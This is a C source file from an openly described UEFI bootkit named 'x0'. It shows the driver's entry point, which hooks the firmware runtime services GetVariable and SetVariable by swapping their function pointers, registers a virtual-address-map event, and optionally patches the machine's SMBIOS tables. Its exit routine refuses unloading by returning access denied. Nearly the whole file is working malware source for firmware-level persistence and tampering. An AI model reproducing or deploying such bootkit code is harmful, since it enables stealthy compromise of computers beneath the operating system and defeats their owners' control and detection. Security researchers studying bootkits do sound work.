/*
 * Copyright (C) 2022 xmmword
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseMemoryLib.h>
#include <IndustryStandard/SmBios.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#include "Utils.h"
#include "Hooks.h"
#include "SmBios.h"
#include "Config/Config.h"


/*
    *    src/bootkit/UefiDriverMain.c
    *    Date: 12/14/22
    *    Author: @xmmword
*/


extern EFI_SYSTEM_TABLE *gST; /* Global EFI System Table. */
extern EFI_RUNTIME_SERVICES *gRT; /* The global UEFI Runtime Service Table. */

extern EFI_GET_VARIABLE OriginalGetVariable; /* Function pointer that points to the GetVariable service. */
extern EFI_SET_VARIABLE OriginalSetVariable; /* Function pointer that points to the SetVariable service. */

extern EFI_EVENT SetVirtualAddressMapEventVar; /* Event variable for the SetVirtualAddressMap event. */

/**
 * @brief Entry point for the x0 UEFI Driver.
 * @param ImageHandle The Image Handle.
 * @param SystemTable The EFI System Table.
 * @returns EFI_SUCCESS on success, EFI_FAILURE on failure.
 */

EFI_STATUS EFIAPI UefiEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
  EFI_STATUS ReturnStatus;

  PrintBanner();
  Print(L"[x0]: Initializing bootkit..\n");

  OriginalGetVariable = HookPointer((VOID **)&gRT->GetVariable, &GetVariableHook, &gRT->Hdr);
  OriginalSetVariable = HookPointer((VOID **)&gRT->SetVariable, &SetVariableHook, &gRT->Hdr);

  Print(L"[x0]: [0x%lx] redirected to [0x%lx] (GetVariableHook)\n", (UINT64)OriginalGetVariable, (UINT64)GetVariableHook);
  Print(L"[x0]: [0x%lx] redirected to [0x%lx] (SetVariableHook)\n", (UINT64)OriginalSetVariable, (UINT64)SetVariableHook);

  if (EFI_ERROR((ReturnStatus = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, VMapEvent,
    NULL, &gEfiEventVirtualAddressChangeGuid, &SetVirtualAddressMapEventVar))))
  {
    return ReturnStatus;
  }

#ifdef CONFIG_PATCH_SMBIOS
  SMBIOS_TABLE_ENTRY_POINT *SmBiosTableEntryPoint = ReturnSmBiosEntryPointAddress();
  if (!SmBiosTableEntryPoint)
    return ReturnStatus;

  Print(L"[x0]: SMBIOS Entry Point located at [0x%p]\n", SmBiosTableEntryPoint);

  PatchSmBiosTables((VOID *)((UINT64)(SmBiosTableEntryPoint->TableAddress)));

  Print(L"[x0]: Patched SMBIOS tables at [0x%p]\n", SmBiosTableEntryPoint->TableAddress);
#endif

  gBS->Stall(5);
  return EFI_SUCCESS;
}

/**
 * @brief Exit point for the x0 UEFI Driver.
 * @param ImageHandle The Image Handle.
 * @returns EFI_ACCESS_DENIED.
 */

EFI_STATUS EFIAPI UefiExit(EFI_HANDLE ImageHandle) {
  /* Nothing here.. */

  return EFI_ACCESS_DENIED;
}